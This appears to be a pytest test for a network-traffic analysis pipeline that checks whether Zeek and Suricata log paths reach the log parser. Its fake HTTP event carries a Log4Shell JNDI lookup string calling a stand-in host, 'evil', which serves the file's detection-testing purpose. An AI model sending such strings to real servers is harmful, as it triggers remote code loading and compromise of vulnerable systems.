from __future__ import annotations

from pathlib import Path

from src.event.models import HttpEvent
from src.orchestrator import pipeline


def test_run_pcap_passes_zeek_and_suricata_logs(monkeypatch, tmp_path: Path) -> None:
    pcap_path = tmp_path / "input.pcap"
    pcap_path.write_bytes(b"\xd4\xc3\xb2\xa1")
    captured = {}

    monkeypatch.setattr(pipeline, "parse_network_events", lambda path: [])
    monkeypatch.setattr(pipeline, "parse_pcap_events", lambda path: [])
    monkeypatch.setattr(pipeline, "pcap_to_csv", lambda src, dst: Path(dst).write_text("", encoding="utf-8"))

    def fake_parse_log_bundle(**kwargs):
        captured.update(kwargs)
        return [
            HttpEvent(
                event_id="zeek1-http-1",
                timestamp=1.0,
                src_ip="10.0.0.1",
                src_port=12345,
                dst_ip="10.0.0.2",
                dst_port=80,
                protocol="HTTP",
                payload_clean="GET /?x=${jndi:ldap://evil/a} HTTP/1.1",
                summary="GET /?x=${jndi:ldap://evil/a}",
                method="GET",
                uri="/?x=${jndi:ldap://evil/a}",
            )
        ]

    class FakeNova:
        def batch_search(self, payloads, top_k=5):
            return [[{"cve": "CVE-2021-44228", "score": 1.0, "rank": 1}] for _ in payloads]

    monkeypatch.setattr(pipeline, "parse_log_bundle", fake_parse_log_bundle)
    monkeypatch.setattr(pipeline, "_build_nova", lambda config, force_demo_index: FakeNova())
    monkeypatch.setattr(pipeline, "analyze_evidence", lambda **kwargs: {"analysis": kwargs})
    monkeypatch.setattr(pipeline, "write_report", lambda analysis, output_dir: Path(output_dir) / "report.md")

    report = pipeline.run_pcap(
        pcap_path,
        {
            "paths": {"csv_dir": str(tmp_path), "index_dir": str(tmp_path / "index")},
            "retrieval": {"model_name": "offline"},
        },
        tmp_path,
        top_k=5,
        force_demo_index=True,
        enable_rag=False,
        enable_ollama=False,
        zeek_logs=["zeek.log"],
        suricata_logs=["eve.jsonl"],
    )

    assert report == tmp_path / "report.md"
    assert captured["zeek_logs"] == ["zeek.log"]
    assert captured["suricata_logs"] == ["eve.jsonl"]
